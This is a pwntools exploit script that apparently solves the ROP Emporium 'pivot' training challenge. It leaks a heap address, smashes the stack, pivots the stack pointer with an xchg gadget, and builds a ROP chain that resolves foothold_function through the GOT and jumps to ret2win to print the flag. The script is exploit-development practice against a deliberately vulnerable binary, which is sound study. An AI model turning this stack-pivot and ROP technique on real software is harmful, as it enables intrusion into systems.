#!/bin/python3

from pwn import *

context.clear(arch='amd64')
filename = './pivot'
libname  = './libpivot.so'

elf = ELF(filename)
lib = ELF(libname)
io = process(filename)

# gadgets
r = ROP(elf)
call_rax    = p64(0x4006b0)         # call rax;
xchg        = p64(0x4009bd)         # xchg rax, rsp; ret;
mov_rax_rax = p64(0x4009c0)         # mov rax, qword ptr [rax]; ret;
add_rax_rbp = p64(0x4009c4)         # add rax, rbp; ret;
pop_rax     = p64(r.rax.address)    # pop rax; ret;
pop_rbp     = p64(r.rbp.address)    # pop rbp; ret;
fthold_plt  = p64(elf.plt.foothold_function)
fthold_got  = p64(elf.got.foothold_function)
ret2win_off = p64(lib.sym.ret2win - lib.sym.foothold_function)

# get leaked address

io.recvuntil("pivot: ")
leak = int(io.recvline().strip()[0:14], 16)
log.info('Leaked: ' + hex(leak))
leak = p64(leak)

# stack smash
# putting leaked address into rsp

smash = ROP(elf)
smash.raw(cyclic(40))
smash.raw(pop_rax)
smash.raw(leak)
smash.raw(xchg)         # put leaked address into rsp

# set up flthold@got.plt

rop = ROP(elf)
rop.raw(fthold_plt)     # gen .got.plt
rop.raw(pop_rax)
rop.raw(fthold_got)     # gen .got.plt

# call ret2win using fthold address + offset

rop.raw(mov_rax_rax)    # mov fthold@got.plt address into rax
rop.raw(pop_rbp)
rop.raw(ret2win_off)    # ret2win - fthold
rop.raw(add_rax_rbp)    # add offset to rax(fthold@got.plt)
rop.raw(call_rax)       # call rax(now pointing to ret2win@got.plt)

io.recvuntil('> ')
io.sendline(rop.chain())
io.recvuntil('> ')
io.sendline(smash.chain())
io.recvuntil('vot\n')
flag = io.recvline().decode().rstrip()
log.success("Flag: {}".format(flag))